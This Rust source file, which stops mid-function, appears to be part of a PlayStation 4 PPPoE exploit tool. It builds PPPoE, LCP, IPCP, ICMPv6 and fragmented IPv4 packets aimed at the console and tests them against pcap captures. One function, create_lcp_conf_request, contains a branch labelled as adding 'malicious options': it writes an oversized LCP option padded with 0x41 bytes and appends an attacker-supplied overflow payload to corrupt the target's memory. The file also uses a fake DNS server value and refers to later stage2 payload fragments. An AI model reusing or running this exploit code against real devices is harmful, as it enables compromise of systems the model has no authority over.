// Import the constants module
use crate::constants;
use packet::ether;
use packet::Builder;
use pnet::packet::icmpv6::MutableIcmpv6Packet;
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::{
    ethernet::{EtherTypes, MutableEthernetPacket},
    icmpv6::{Icmpv6Code, Icmpv6Types},
    ipv6::MutableIpv6Packet,
};

pub fn create_pado_packet(
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    ac_cookie: Option<Vec<u8>>,
    host_uniq: [u8; 8],
) -> Vec<u8> {
    let mut payload = Vec::new();
    // PPPoE header
    payload.push(0x11); // Version (1) and Type (1)
    payload.push(constants::PPPOE_CODE_PADO); // Code (PADO)
    payload.extend_from_slice(&0u16.to_be_bytes()); // Session ID (not used in PADO)

    // Placeholder for Payload Length (2 bytes), will be set later
    let payload_length_pos = payload.len();
    payload.extend_from_slice(&[0, 0]);

    if let Some(bytes) = ac_cookie {
        payload.extend_from_slice(&constants::PPPOE_TAG_ACOOKIE.to_be_bytes());
        payload.extend_from_slice(&(bytes.len() as u16).to_be_bytes());
        payload.extend_from_slice(&bytes);
    } else {
        payload.extend_from_slice(&constants::PPPOE_TAG_ACOOKIE.to_be_bytes());
        payload.extend_from_slice(&[0x00, 0x00]);
    }
    // PPPoE Tag for HUNIQUE
    payload.extend_from_slice(&constants::PPPOE_TAG_HOST_UNIQ.to_be_bytes());
    payload.extend_from_slice(&(host_uniq.len() as u16).to_be_bytes());
    payload.extend_from_slice(&host_uniq);

    // Set the Payload Length
    let payload_length = payload.len() - payload_length_pos - 2;
    payload[payload_length_pos..payload_length_pos + 2]
        .copy_from_slice(&(payload_length as u16).to_be_bytes());

    ether::Builder::default()
        .source(source_mac.into())
        .unwrap()
        .destination(target_mac.into())
        .unwrap()
        .protocol(ether::Protocol::PppoeDiscovery)
        .unwrap()
        .payload(&payload)
        .unwrap()
        .build()
        .unwrap()
}

pub fn create_pads_packet(
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    session_id: [u8; 2],
    host_uniq: [u8; 8],
) -> Vec<u8> {
    let mut payload = Vec::new();

    // PPPoE header
    payload.push(0x11); // Version (1) and Type (1)
    payload.push(constants::PPPOE_CODE_PADS); // Code (PADS)
    payload.extend_from_slice(&session_id); // Session ID

    // We know fixed size of 12
    payload.extend_from_slice(&[0, 12]);

    // PPPoE Tag for HUNIQUE
    payload.extend_from_slice(&constants::PPPOE_TAG_HOST_UNIQ.to_be_bytes());
    payload.extend_from_slice(&(host_uniq.len() as u16).to_be_bytes());
    payload.extend_from_slice(&host_uniq);

    ether::Builder::default()
        .source(source_mac.into())
        .unwrap()
        .destination(target_mac.into())
        .unwrap()
        .protocol(ether::Protocol::PppoeDiscovery)
        .unwrap()
        .payload(&payload)
        .unwrap()
        .build()
        .unwrap()
}

pub fn create_padt_packet(
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    session_id: [u8; 2],
) -> Vec<u8> {
    let mut payload = Vec::new();

    // PPPoE header
    payload.push(0x11); // Version (1) and Type (1)
    payload.push(constants::PPPOE_CODE_PADT); // Code (PADt)
    payload.extend_from_slice(&session_id); // Session ID

    // We know fixed size of 0
    payload.extend_from_slice(&[0, 0]);

    ether::Builder::default()
        .source(source_mac.into())
        .unwrap()
        .destination(target_mac.into())
        .unwrap()
        .protocol(ether::Protocol::PppoeDiscovery)
        .unwrap()
        .payload(&payload)
        .unwrap()
        .build()
        .unwrap()
}

pub fn create_lcp_echo_reply(
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    session_id: [u8; 2],
    identifier: u8,
    magic_number: [u8; 4],
) -> Vec<u8> {
    let mut packet = Vec::new();

    // Ethernet header
    packet.extend_from_slice(&target_mac);
    packet.extend_from_slice(&source_mac);
    packet.extend_from_slice(&constants::ETHERTYPE_PPPOESESS.to_be_bytes());

    // PPPoE header
    let version_type = 0x11; // Version 1, Type 1
    let code = 0x00; // PPPoE Session
    let session_id = u16::from_be_bytes(session_id);
    packet.push(version_type);
    packet.push(code);
    packet.extend_from_slice(&session_id.to_be_bytes());

    // Fixed PPP payload length (6 bytes)
    let fixed_payload_length = 10_u16.to_be_bytes();
    packet.extend_from_slice(&fixed_payload_length);

    // PPP header
    packet.extend_from_slice(&constants::ETHERTYPE_LCP.to_be_bytes());

    // LCP Echo Reply
    let lcp_code = 0x0A; // Echo Reply
    packet.push(lcp_code);
    packet.push(identifier);

    // LCP packet length field (4 bytes: code, identifier, length field itself)
    let lcp_length = 8_u16.to_be_bytes();
    packet.extend_from_slice(&lcp_length);

    // Magic Number
    packet.extend_from_slice(&magic_number);

    packet
}

pub fn create_lcp_conf_ack(
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    session_data: u8,
    session_id: [u8; 2],
    identifier: u8,
) -> Vec<u8> {
    let mut payload = Vec::new();
    // PPPoE header
    payload.push(0x11); // Version (1) and Type (1)
    payload.push(session_data);
    payload.extend_from_slice(&session_id);

    // Fixed length
    payload.extend_from_slice(&[0, 6]);

    // PPP header
    payload.extend_from_slice(&constants::ETHERTYPE_LCP.to_be_bytes());

    // LCP and fixed length
    payload.push(constants::LCP_CONF_ACK); // Configuration Ack
    payload.push(identifier);
    payload.extend_from_slice(&[0, 4]);

    ether::Builder::default()
        .source(source_mac.into())
        .unwrap()
        .destination(target_mac.into())
        .unwrap()
        .protocol(constants::ETHERTYPE_PPPOESESS.into())
        .unwrap()
        .payload(&payload)
        .unwrap()
        .build()
        .unwrap()
}

pub fn create_lcp_term_req(
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    session_data: u8,
    session_id: [u8; 2],
    identifier: u8,
) -> Vec<u8> {
    let mut payload = Vec::new();
    // PPPoE header
    payload.push(0x11); // Version (1) and Type (1)
    payload.push(session_data);
    payload.extend_from_slice(&session_id);

    // Fixed length
    payload.extend_from_slice(&[0, 6]);

    // PPP header
    payload.extend_from_slice(&constants::ETHERTYPE_LCP.to_be_bytes());

    // LCP and fixed length
    payload.push(constants::LCP_TERM_REQ); // Configuration Ack
    payload.push(identifier);
    payload.extend_from_slice(&[0, 4]);

    ether::Builder::default()
        .source(source_mac.into())
        .unwrap()
        .destination(target_mac.into())
        .unwrap()
        .protocol(constants::ETHERTYPE_PPPOESESS.into())
        .unwrap()
        .payload(&payload)
        .unwrap()
        .build()
        .unwrap()
}

pub fn create_lcp_conf_request(
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    session_data: u8,
    session_id: [u8; 2],
    overflow_lle: Option<Vec<u8>>,
) -> Vec<u8> {
    let mut payload = Vec::new();

    // PPPoE header
    payload.push(0x11); // Version (1) and Type (1)
    payload.push(session_data);
    payload.extend_from_slice(&session_id);

    let length_index = payload.len(); // Store the index where the length will be inserted
    payload.extend_from_slice(&[0x00, 0x00]);

    // PPP header
    payload.extend_from_slice(&constants::ETHERTYPE_LCP.to_be_bytes());

    // LCP and fixed length
    payload.push(constants::LCP_CONF_REQ); // Configuration Request
    payload.push(constants::LCP_ID);

    if overflow_lle.is_some() {
        // Read https://datatracker.ietf.org/doc/html/rfc1661#section-6 and now I know
        payload.extend_from_slice(&[0x01, 0x04]); // 260 lcp size when adding the malicious options

        // Option
        payload.push(0x00); // The RESERVED type
        payload.push(0xfe); // The Length of the lcp options size 254
        for _ in 0..252 {
            payload.push(0x41);
        }
        // Push the length of the remaining stuff
        payload.extend_from_slice(&[0x00, 0x7A]); // 122
        payload.extend_from_slice(&overflow_lle.unwrap());
    } else {
        payload.extend_from_slice(&[0, 4]); // 4 lcp size whithout adding the malicious options
    }

    // Now, calculate the actual payload length
    let payload_length = (payload.len() - 6) as u16;

    // Update the length field in the PPPoE header (stored at length_index)
    let length_bytes = payload_length.to_be_bytes();
    payload[length_index] = length_bytes[0];
    payload[length_index + 1] = length_bytes[1];

    ether::Builder::default()
        .source(source_mac.into())
        .unwrap()
        .destination(target_mac.into())
        .unwrap()
        .protocol(constants::ETHERTYPE_PPPOESESS.into())
        .unwrap()
        .payload(&payload)
        .unwrap()
        .build()
        .unwrap()
}

pub fn create_ipcp_conf_ack(
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    session_data: u8,
    session_id: [u8; 2],
    ipcp_identifier: u8,
    ip_address: [u8; 4],
    dns: [u8; 4],
) -> Vec<u8> {
    let mut payload = Vec::new();

    // PPPoE header
    payload.push(0x11); // Version (1) and Type (1)
    payload.push(session_data);
    payload.extend_from_slice(&session_id);

    // Fixed length
    payload.extend_from_slice(&[0, 24]);

    payload.extend_from_slice(&constants::ETHERTYPE_IPCP.to_be_bytes());

    // IPCP and fixed length
    payload.push(constants::IPCP_CONF_ACK); // Configuration ACK
    payload.push(ipcp_identifier); //Identifier used to match req and rep
    payload.extend_from_slice(&[0, 22]);

    // IP
    payload.push(constants::IP_ADDRESS_TYPE); // Configuration Request
                                              // Fixed length
    payload.push(0x6);
    payload.extend_from_slice(&ip_address);

    //DNS1
    payload.push(0x81);
    payload.push(0x6);
    payload.extend_from_slice(&dns);

    //DNS2
    payload.push(0x83);
    payload.push(0x6);
    payload.extend_from_slice(&dns);

    ether::Builder::default()
        .source(source_mac.into())
        .unwrap()
        .destination(target_mac.into())
        .unwrap()
        .protocol(ether::Protocol::PppoeSession)
        .unwrap()
        .payload(&payload)
        .unwrap()
        .build()
        .unwrap()
}

pub fn create_ipcp_conf_nak(
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    session_data: u8,
    session_id: [u8; 2],
    ipcp_identifier: u8,
    ip_address: [u8; 4],
) -> Vec<u8> {
    let mut payload = Vec::new();

    // PPPoE header
    payload.push(0x11); // Version (1) and Type (1)
    payload.push(session_data);
    payload.extend_from_slice(&session_id);

    // Fixed length
    payload.extend_from_slice(&[0, 12]);

    // PPP header
    payload.extend_from_slice(&constants::ETHERTYPE_IPCP.to_be_bytes());

    // IPCP and fixed length
    payload.push(constants::IPCP_CONF_NAK); // Configuration NAK
    payload.push(ipcp_identifier);
    payload.extend_from_slice(&[0, 10]);

    // IP
    payload.push(constants::IP_ADDRESS_TYPE); // Configuration Request
                                              // Fixed length
    payload.push(0x6);
    payload.extend_from_slice(&ip_address);

    ether::Builder::default()
        .source(source_mac.into())
        .unwrap()
        .destination(target_mac.into())
        .unwrap()
        .protocol(ether::Protocol::PppoeSession)
        .unwrap()
        .payload(&payload)
        .unwrap()
        .build()
        .unwrap()
}

pub fn create_ipcp_conf_request(
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    session_data: u8,
    session_id: [u8; 2],
    ipcp_identifier: u8,
    ip_address: [u8; 4],
) -> Vec<u8> {
    let mut payload = Vec::new();

    // PPPoE header
    payload.push(0x11); // Version (1) and Type (1)
    payload.push(session_data);
    payload.extend_from_slice(&session_id);

    // Fixed length
    payload.extend_from_slice(&[0, 12]);

    // PPP header
    payload.extend_from_slice(&constants::ETHERTYPE_IPCP.to_be_bytes());

    // IPCP and fixed length
    payload.push(constants::IPCP_CONF_REQ); // Configuration Request
    payload.push(ipcp_identifier);
    payload.extend_from_slice(&[0, 10]);

    // IP
    payload.push(constants::IP_ADDRESS_TYPE); // Configuration Request
                                              // Fixed length
    payload.push(0x6);
    payload.extend_from_slice(&ip_address);

    ether::Builder::default()
        .source(source_mac.into())
        .unwrap()
        .destination(target_mac.into())
        .unwrap()
        .protocol(ether::Protocol::PppoeSession)
        .unwrap()
        .payload(&payload)
        .unwrap()
        .build()
        .unwrap()
}

pub fn create_icmpv6_adv(
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    source_v6: [u8; 16],
    target_v6: [u8; 16],
) -> Vec<u8> {
    let mut packet = vec![0u8; 14 + 40 + 8 + 16 + 8]; // Ethernet + IPv6 + ICMPv6 + Target Address + Options

    // Ethernet frame
    {
        let mut eth_packet = MutableEthernetPacket::new(&mut packet[..14]).unwrap();
        eth_packet.set_source(source_mac.into());
        eth_packet.set_destination(target_mac.into());
        eth_packet.set_ethertype(EtherTypes::Ipv6);
    }

    // IPv6 packet
    {
        let mut ipv6_packet = MutableIpv6Packet::new(&mut packet[14..54]).unwrap();
        ipv6_packet.set_version(6);
        ipv6_packet.set_traffic_class(0);
        ipv6_packet.set_flow_label(0);
        ipv6_packet.set_payload_length(32);
        ipv6_packet.set_next_header(IpNextHeaderProtocols::Icmpv6);
        ipv6_packet.set_hop_limit(0xff);
        ipv6_packet.set_source(source_v6.into());
        ipv6_packet.set_destination(target_v6.into());
    }

    // ICMPv6 Neighbor Advertisement
    {
        let mut icmpv6_packet = MutableIcmpv6Packet::new(&mut packet[54..(54 + 8)]).unwrap();
        icmpv6_packet.set_icmpv6_type(Icmpv6Types::NeighborAdvert);
        icmpv6_packet.set_icmpv6_code(Icmpv6Code(0));

        // Hardcoded flags
        let flags_offset = 4; // First 4 bytes are for type, code, checksum
        packet[54 + flags_offset] = 0xe0;
    }

    // Set the target address (16 bytes IPv6) after the ICMPv6 header
    packet[62..(62 + 16)].copy_from_slice(&source_v6);

    // ICMPv6 Option: Source Link-Layer Address (8 bytes)
    let options_offset: usize = 62 + 16;
    packet[options_offset] = 2; // Type: Source Link-Layer Address
    packet[options_offset + 1] = 1; // Length: 1 (in 8-byte blocks)
    packet[options_offset + 2..(options_offset + 8)].copy_from_slice(&source_mac);

    // Calculate ICMPv6 checksum
    {
        let mut icmpv6_packet = MutableIcmpv6Packet::new(&mut packet[54..]).unwrap();
        let checksum = pnet::packet::icmpv6::checksum(
            &icmpv6_packet.to_immutable(),
            &source_v6.into(),
            &target_v6.into(),
        );
        icmpv6_packet.set_checksum(checksum);
    }

    packet
}

pub fn create_icmpv6_echo_req(
    source_mac: [u8; 6],
    target_mac: [u8; 6],
    source_v6: [u8; 16],
    target_v6: [u8; 16],
) -> Vec<u8> {
    let mut packet = vec![0u8; 14 + 40 + 8]; // Ethernet + IPv6 + ICMPv6 Echo Request

    // Ethernet frame
    let mut eth_packet = MutableEthernetPacket::new(&mut packet[..14]).unwrap();
    eth_packet.set_source(source_mac.into());
    eth_packet.set_destination(target_mac.into());
    eth_packet.set_ethertype(EtherTypes::Ipv6);

    // IPv6 packet
    let mut ipv6_packet = MutableIpv6Packet::new(&mut packet[14..54]).unwrap();
    ipv6_packet.set_version(6);
    ipv6_packet.set_traffic_class(0);
    ipv6_packet.set_flow_label(0);
    ipv6_packet.set_payload_length(8);
    ipv6_packet.set_next_header(IpNextHeaderProtocols::Icmpv6);
    ipv6_packet.set_hop_limit(64);
    ipv6_packet.set_source(source_v6.into());
    ipv6_packet.set_destination(target_v6.into());

    // ICMPv6 Echo Request
    let mut icmpv6_packet = MutableIcmpv6Packet::new(&mut packet[54..]).unwrap();
    icmpv6_packet.set_icmpv6_type(Icmpv6Types::EchoRequest);
    icmpv6_packet.set_icmpv6_code(Icmpv6Code(0));

    // Calculate ICMPv6 checksum
    let checksum = pnet::packet::icmpv6::checksum(
        &icmpv6_packet.to_immutable(),
        &source_v6.into(),
        &target_v6.into(),
    );
    icmpv6_packet.set_checksum(checksum);

    packet
}

pub fn create_udp_header(source_port: [u8; 2], dest_port: [u8; 2], total_length: usize) -> Vec<u8> {
    let mut header = Vec::new();
    header.extend_from_slice(&source_port);
    header.extend_from_slice(&dest_port);
    header.extend_from_slice(&(total_length as u16).to_be_bytes());
    header.extend_from_slice(&[0x00, 0x00]); // cheksum header TODO
    header
}

fn ipv4_checksum(header: &[u8]) -> [u8; 2] {
    // Ensure the header length is at least 20 bytes (minimum IPv4 header size)
    if header.len() < 20 {
        panic!("Invalid IPv4 header: size must be at least 20 bytes.");
    }
    let mut sum: u32 = 0;

    // Process all 16-bit words, setting checksum field to zero
    for i in (0..header.len()).step_by(2) {
        if i == 10 {
            // Skip checksum field (bytes 10 and 11)
            continue;
        }

        let word = if i + 1 < header.len() {
            ((header[i] as u32) << 8) | (header[i + 1] as u32)
        } else {
            (header[i] as u32) << 8 // Handle odd-length headers
        };

        sum = sum.wrapping_add(word);
    }

    // Add back the carry bits
    while (sum >> 16) != 0 {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }

    // Take one's complement
    let checksum = !sum as u16;

    // Return as big-endian byte array
    [(checksum >> 8) as u8, (checksum & 0xFF) as u8]
}

pub fn create_ipv4_packet(
    source_ipv4: [u8; 4],
    target_ipv4: [u8; 4],
    is_last: bool,
    data: Vec<u8>,
    fragment_off: usize,
) -> Vec<u8> {
    let mut packet = Vec::new();

    // IPv4 header
    packet.push(0x08); // IPV4
    packet.push(0x00);

    packet.push(0x45); // v4 and size TODO
    packet.push(0x00); // differentieted service field

    // Placeholder for Payload Length (2 bytes), will be set later
    let packet_lenght_pos = packet.len();
    packet.extend_from_slice(&[0, 0]);

    packet.extend_from_slice(&[0x00, 0x01]); //TODO identification

    // Fragment offset and flag
    let mut value: u16 = 0;
    if is_last {
        value = 0x0000 + fragment_off as u16; // No more packets
    } else {
        value = 0x2000 + fragment_off as u16; // There are more packets
    }
    packet.extend_from_slice(&value.to_be_bytes()); // Fragment offset

    packet.push(0x40); // TTL
    packet.push(0x11); // udp

    // Placeholder for checksum Length (2 bytes), will be set later
    let packet_cs_pos = packet.len();
    packet.extend_from_slice(&[0, 0]);

    packet.extend_from_slice(&source_ipv4);
    packet.extend_from_slice(&target_ipv4);

    //Data
    packet.extend_from_slice(&data);

    // Set the Payload Length
    let packet_length = packet.len() - packet_lenght_pos + 2;
    packet[packet_lenght_pos..packet_lenght_pos + 2]
        .copy_from_slice(&(packet_length as u16).to_be_bytes());

    let check = ipv4_checksum(&packet[2..22]);
    packet[packet_cs_pos..packet_cs_pos + 2].copy_from_slice(&(check));

    packet
}

#[cfg(test)]
mod tests {
    use super::*;
    use constants::SOURCE_MAC;
    use pcap::Capture;
    use std::fs::remove_file;
    use std::fs::File;
    use std::io::Read;
    use std::io::Write;

    fn get_test_ps4_mac() -> [u8; 6] {
        [0xc8, 0x63, 0xf1, 0x44, 0x45, 0x97]
    }

    fn get_test_host_mac() -> [u8; 6] {
        [0x07, 0x2c, 0xf6, 0x06, 0xba, 0x9b]
    }

    fn get_test_host_unique() -> [u8; 8] {
        [0x00, 0x2c, 0xf6, 0x06, 0xba, 0x9b, 0xff, 0xff]
    }

    fn compare_packets(packet_type: &str, expected: &[u8], generated: &[u8]) {
        let generated_filename = format!("test_data/generated_{}.bin", packet_type);
        let expected_filename = format!("test_data/expected_{}.bin", packet_type);

        // Write the generated packet to a binary file
        let mut generated_file = File::create(&generated_filename)
            .expect("Failed to create binary file for generated packet");
        generated_file
            .write_all(generated)
            .expect("Failed to write generated packet to binary file");

        // Write the expected packet to a binary file
        let mut expected_file = File::create(&expected_filename)
            .expect("Failed to create binary file for expected packet");
        expected_file
            .write_all(expected)
            .expect("Failed to write expected packet to binary file");

        // Compare the lengths of the expected and generated packets
        assert_eq!(
            expected.len(),
            generated.len(),
            "Packet lengths are not equal for {}",
            packet_type
        );

        // Compare the contents of the expected and generated packets byte by byte
        for (idx, (expected_byte, generated_byte)) in
            expected.iter().zip(generated.iter()).enumerate()
        {
            assert_eq!(
                expected_byte, generated_byte,
                "Byte mismatch at index {} for {}: expected {:02x}, got {:02x}",
                idx, packet_type, expected_byte, generated_byte
            );
        }

        // Delete the temporary files
        remove_file(&generated_filename).expect("Failed to delete generated packet file");
        remove_file(&expected_filename).expect("Failed to delete expected packet file");
    }

    #[test]
    fn test_create_ipcp_conf_ack() {
        let mut cap =
            Capture::from_file("test_data/ipcp_conf_ack.pcap").expect("Failed to open pcap file");
        let expected_packet = cap
            .next_packet()
            .expect("Failed to read IPCP CONF ACK packet");

        let source_mac = get_test_host_mac();
        let target_mac = get_test_ps4_mac();
        let session_data = 0x00;
        let session_id = constants::PPPOE_SESSION_ID.to_be_bytes();
        let ip_address = [42, 42, 42, 42];
        let dns = constants::FAKE_PRIMARY_DNS_SERVER;

        let generated_packet = create_ipcp_conf_ack(
            source_mac,
            target_mac,
            session_data,
            session_id,
            3, // the test data has 3 for ipcp req
            ip_address,
            dns,
        );

        compare_packets("ipcp_conf_ack", &expected_packet.data, &generated_packet);
    }

    #[test]
    fn test_create_ipcp_conf_nak() {
        let mut cap =
            Capture::from_file("test_data/ipcp_conf_nak.pcap").expect("Failed to open pcap file");
        let expected_packet = cap
            .next_packet()
            .expect("Failed to read IPCP CONF NAK packet");

        let source_mac = get_test_host_mac();
        let target_mac = get_test_ps4_mac();
        let session_data = 0x00;
        let session_id = constants::PPPOE_SESSION_ID.to_be_bytes();
        let ip_address = [42, 42, 42, 42];

        let generated_packet = create_ipcp_conf_nak(
            source_mac,
            target_mac,
            session_data,
            session_id,
            2, // test uses 2
            ip_address,
        );

        compare_packets("ipcp_conf_nak", &expected_packet.data, &generated_packet);
    }

    #[test]
    fn test_create_ipcp_conf_request() {
        let mut cap = Capture::from_file("test_data/ipcp_conf_request.pcap")
            .expect("Failed to open pcap file");
        let expected_packet = cap
            .next_packet()
            .expect("Failed to read IPCP CONF REQUEST packet");

        let source_mac = get_test_host_mac();
        let target_mac = get_test_ps4_mac();
        let session_data = 0x00;
        let session_id = constants::PPPOE_SESSION_ID.to_be_bytes();
        let ip_address = constants::SOURCE_IPV4;

        let generated_packet = create_ipcp_conf_request(
            source_mac,
            target_mac,
            session_data,
            session_id,
            0x41, //test uses 0x41
            ip_address,
        );

        compare_packets(
            "ipcp_conf_request",
            &expected_packet.data,
            &generated_packet,
        );
    }

    #[test]
    fn test_create_pads_packet() {
        let mut cap =
            Capture::from_file("test_data/pads_packet.pcap").expect("Failed to open pcap file");
        let expected_packet = cap.next_packet().expect("Failed to read PADS packet");

        let source_mac = get_test_host_mac();
        let target_mac = get_test_ps4_mac();
        let session_id = constants::PPPOE_SESSION_ID.to_be_bytes();
        let host_uniq = get_test_host_unique();

        let generated_packet = create_pads_packet(source_mac, target_mac, session_id, host_uniq);

        compare_packets("pads_packet", &expected_packet.data, &generated_packet);
    }

    #[test]
    fn test_create_icmpv6_adv() {
        let mut cap =
            Capture::from_file("test_data/icmpv6_adv.pcap").expect("Failed to open pcap file");
        let expected_packet = cap
            .next_packet()
            .expect("Failed to read ICMPv6 Advertisement packet");

        let source_mac: [u8; 6] = get_test_host_mac();
        let target_mac: [u8; 6] = get_test_ps4_mac();
        let source_v6: [u8; 16] = [
            0xfe, 0x80, 0, 0, 0, 0, 0, 0, 0, 0, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
        ];
        let target_v6: [u8; 16] = [
            0xfe, 0x80, 0, 0, 0, 0, 0, 0, 0xca, 0x63, 0xf1, 0xff, 0xfe, 0x44, 0x45, 0x97,
        ];

        let generated_packet = create_icmpv6_adv(source_mac, target_mac, source_v6, target_v6);

        compare_packets("icmpv6_adv", &expected_packet.data, &generated_packet);
    }

    #[test]
    fn test_create_icmpv6_echo_req() {
        let mut cap =
            Capture::from_file("test_data/icmpv6_echo_req.pcap").expect("Failed to open pcap file");
        let expected_packet = cap
            .next_packet()
            .expect("Failed to read ICMPv6 Echo Request packet");

        let source_mac = get_test_host_mac();
        let target_mac = get_test_ps4_mac();
        let source_v6: [u8; 16] = [
            0xfe, 0x80, 0, 0, 0, 0, 0, 0, 0, 0, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
        ];
        let target_v6: [u8; 16] = [
            0xfe, 0x80, 0, 0, 0, 0, 0, 0, 0xca, 0x63, 0xf1, 0xff, 0xfe, 0x44, 0x45, 0x97,
        ];

        let generated_packet = create_icmpv6_echo_req(source_mac, target_mac, source_v6, target_v6);

        compare_packets("icmpv6_echo_req", &expected_packet.data, &generated_packet);
    }

    #[test]
    fn test_create_lcp_conf_request_normal() {
        // Load the expected packet from a .pcap file for comparison
        let mut cap = Capture::from_file("test_data/lcp_conf_request.pcap")
            .expect("Failed to open pcap file");
        let expected_packet = cap
            .next_packet()
            .expect("Failed to read LCP CONF REQUEST packet");

        // Define the test input data
        let source_mac = get_test_host_mac(); // Function that retrieves a test MAC for the source
        let target_mac = get_test_ps4_mac(); // Function that retrieves a test MAC for the target
        let session_data = 0x00; // Example session data byte
        let session_id = constants::PPPOE_SESSION_ID.to_be_bytes(); // Example session ID (2 bytes)

        // Call the function to generate the LCP CONF REQUEST packet
        let generated_packet =
            create_lcp_conf_request(source_mac, target_mac, session_data, session_id, None);

        // Compare the expected packet with the generated packet
        compare_packets("lcp_conf_request", &expected_packet.data, &generated_packet);
    }

    fn hex_to_bytes(hex: &str) -> Vec<u8> {
        (0..hex.len())
            .step_by(2)
            .map(|i| u8::from_str_radix(&hex[i..i + 2], 16).unwrap())
            .collect()
    }

    #[test]
    fn test_ipv4_checksum() {
        // Known test case
        let header = hex_to_bytes("45000414000120804011afb2292929292a2a2a2a");
        let checksum = ipv4_checksum(&header);

        assert_eq!(
            checksum,
            [0xaf, 0xb2],
            "Checksum mismatch: got {:02x}{:02x}, expected afb2",
            checksum[0],
            checksum[1]
        );

        // Known test case
        let header: Vec<u8> = hex_to_bytes("450002ad0001010040110000292929292a2a2a2a");
        let checksum = ipv4_checksum(&header);

        assert_eq!(
            checksum,
            [0xd0, 0x99],
            "Checksum mismatch: got {:02x}{:02x}, expected d099",
            checksum[0],
            checksum[1]
        );
    }

    #[test]
    fn test_create_lcp_term_req() {
        // Load the expected packet from a .pcap file for comparison
        let mut cap = Capture::from_file("test_data/lcp_term_request.pcap")
            .expect("Failed to open pcap file");
        let expected_packet = cap
            .next_packet()
            .expect("Failed to read LCP CONF REQUEST packet");

        // Define the test input data
        let source_mac = get_test_host_mac(); // Function that retrieves a test MAC for the source
        let target_mac = get_test_ps4_mac(); // Function that retrieves a test MAC for the target
        let session_data = 0x00; // Example session data byte
        let session_id = constants::PPPOE_SESSION_ID.to_be_bytes(); // Example session ID (2 bytes)

        // Call the function to generate the LCP CONF REQUEST packet
        let generated_packet =
            create_lcp_term_req(source_mac, target_mac, session_data, session_id, 0);

        // Compare the expected packet with the generated packet
        compare_packets("lcp_term_request", &expected_packet.data, &generated_packet);
    }

    #[test]
    fn test_create_pado_packet() {
        let mut cap =
            Capture::from_file("test_data/pado_no_ac.pcap").expect("Failed to open pcap file");
        let expected_packet = cap.next_packet().expect("Failed to read PADO packet");

        let source_mac = constants::SOURCE_MAC; // Here the pcap uses this one
        let target_mac = get_test_ps4_mac();
        let ac_cookie = None; // no ac
        let host_uniq = [0x00, 0x32, 0xc1, 0x06, 0xba, 0x9b, 0xff, 0xff]; //test file
        let generated_packet = create_pado_packet(source_mac, target_mac, ac_cookie, host_uniq);

        compare_packets("pado_packet", &expected_packet.data, &generated_packet);
    }

    #[test]
    fn test_create_padt_packet() {
        let mut cap =
            Capture::from_file("test_data/padt_packet.pcap").expect("Failed to open pcap file");
        let expected_packet = cap.next_packet().expect("Failed to read PADT packet");

        let source_mac = [0x97, 0x5f, 0xb5, 0xa1, 0xff, 0xff];

        let target_mac = get_test_ps4_mac();
        let session_id = constants::PPPOE_SESSION_ID.to_be_bytes();

        let generated_packet = create_padt_packet(source_mac, target_mac, session_id);

        compare_packets("padt_packet", &expected_packet.data, &generated_packet);
    }

    #[test]
    fn test_create_lcp_conf_ack() {
        let mut cap = Capture::from_file("test_data/lcp_conf_ack_to_ps4.pcap")
            .expect("Failed to open pcap file");
        let expected_packet = cap
            .next_packet()
            .expect("Failed to read LCP Conf ACK packet");

        let source_mac = get_test_host_mac();
        let target_mac = get_test_ps4_mac();
        let session_data = 0x00;
        let session_id = constants::PPPOE_SESSION_ID.to_be_bytes();
        let identifier = 0x02; // test identifier

        let generated_packet =
            create_lcp_conf_ack(source_mac, target_mac, session_data, session_id, identifier);

        compare_packets(
            "lcp_conf_ack_to_ps4",
            &expected_packet.data,
            &generated_packet,
        );
    }

    // TODO add test where stage2 is taken and compleate 3 ipv4 are created
}

pub fn is_padi_packet(data: &[u8]) -> bool {
    // Check if packet length is sufficient for PPPoE Discovery header
    if data.len() < 14 + 6 {
        return false;
    }

    // Check Ethernet type field for PPPoE Discovery (0x8863)
    let ethertype = u16::from_be_bytes([data[12], data[13]]);
    if ethertype != constants::ETHERTYPE_PPPOEDISC {
        return false;
    }

    // Check PPPoE code field for PADI (0x09)
    let pppoe_code = u8::from_be_bytes([data[15]]);
    pppoe_code == constants::PPPOE_CODE_PADI
}
pub fn is_padr_packet(data: &[u8]) -> bool {
    // Check if packet length is sufficient for PPPoE Discovery header
    if data.len() < 14 + 6 {
        return false;
    }

    // Check Ethernet type field for PPPoE Discovery (0x8863)
    let ethertype = u16::from_be_bytes([data[12], data[13]]);
    if ethertype != constants::ETHERTYPE_PPPOEDISC {
        return false;
    }

    // Check PPPoE code field for PADR
    let pppoe_code = u8::from_be_bytes([data[15]]);
    pppoe_code == constants::PPPOE_CODE_PADR
}
pub fn is_ipcp_conf_req(data: &[u8]) -> bool {
    // Check if packet length is sufficient for PPP header
    if data.len() < 14 + 6 {
        return false;
    }

    // PPP IPCP
    // Check Ethernet type field (0xc021)
    let ethertype = u16::from_be_bytes([data[20], data[21]]);
    if ethertype != constants::ETHERTYPE_IPCP {
        return false;
    }

    // PPP IPCP config ack
    let code = u8::from_be_bytes([data[22]]);
    code == constants::IPCP_CONF_REQ
}
pub fn is_ipcp_conf_ack(data: &[u8]) -> bool {
    // Check if packet length is sufficient for PPP header
    if data.len() < 14 + 6 {
        return false;
    }

    // PPP IPCP
    // Check Ethernet type field (0xc021)
    let ethertype = u16::from_be_bytes([data[20], data[21]]);
    if ethertype != constants::ETHERTYPE_IPCP {
        return false;
    }

    // PPP IPCP config ack
    let code = u8::from_be_bytes([data[22]]);
    code == constants::IPCP_CONF_ACK
}
pub fn is_lcp_conf_ack(data: &[u8]) -> bool {
    // Check if packet length is sufficient for PPP header
    if data.len() < 14 + 6 {
        return false;
    }

    // PPP LCP
    // Check Ethernet type field (0xc021)
    let ethertype = u16::from_be_bytes([data[20], data[21]]);
    if ethertype != constants::ETHERTYPE_LCP {
